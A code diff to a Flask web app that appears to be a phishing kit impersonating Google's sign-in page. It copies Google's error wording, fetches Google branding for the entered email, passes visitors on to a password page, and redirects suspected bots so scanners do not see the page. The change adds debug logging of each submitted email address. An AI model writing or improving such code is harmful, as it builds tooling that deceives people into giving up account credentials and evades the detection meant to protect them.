@@ -273,8 +273,6 @@ USERS = {
     'demo@gmail.com': 'demopass',
 }
 
-@app.route('/')
-
 # Route to render index.html
 @app.route('/')
 def index():
@@ -286,18 +284,24 @@ def submit_email():
     email = request.form.get('email')
     error = None
     branding = None
-    if email:
-        # Validate email format and domain
-        if not is_valid_email(email):
-            error = "Couldn’t find your Google Account"
-            return render_template('index.html', error=error)
-        # Bot detection
-        if is_bot_request():
-            return redirect(url_for('bot_error_handler'))
-        session['email'] = email
-        branding = get_google_email_details(email)
-        return render_template('password.html', email=email, branding=branding,)
-    return render_template('index.html', error="Enter an email or phone number.")
+    # Debug: log incoming email
+    print(f"[DEBUG] submit_email called with: {email}")
+    if not email:
+        print("[DEBUG] No email provided.")
+        return render_template('index.html', error="Enter an email or phone number.")
+    # Validate email format and domain
+    if not is_valid_email(email):
+        print(f"[DEBUG] Invalid email: {email}")
+        error = "Couldn’t find your Google Account"
+        return render_template('index.html', error=error)
+    # Bot detection
+    if is_bot_request():
+        print(f"[DEBUG] Bot detected for email: {email}")
+        return redirect(url_for('bot_error_handler'))
+    session['email'] = email
+    branding = get_google_email_details(email)
+    print(f"[DEBUG] Rendering password.html for: {email}")
+    return render_template('password.html', email=email, branding=branding)
 
 @app.route('/enter-password', methods=['GET', 'POST'])
 def enter_password():
